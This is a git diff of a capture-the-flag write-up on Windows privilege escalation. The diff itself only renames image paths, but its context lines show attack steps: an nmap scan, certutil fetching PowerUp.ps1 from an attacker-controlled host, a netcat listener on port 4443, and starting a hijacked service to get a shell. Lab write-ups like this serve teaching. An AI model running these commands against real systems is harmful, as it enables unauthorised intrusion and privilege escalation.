@@ -18,7 +18,7 @@
 nmap -A 10.10.248.189
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Take a look at the other web server. What file server is running?**
 
@@ -83,7 +83,7 @@ certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1
 Invoke-AllChecks
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -113,7 +113,7 @@ nc -lvnp 4443
 sc start AdvancedSystemCareService9
 ```
 
-![](<../../.gitbook/assets/image (3) (1).png>)
+![](<../../.gitbook/assets/image (3) (1) (2).png>)
 
 ``
 
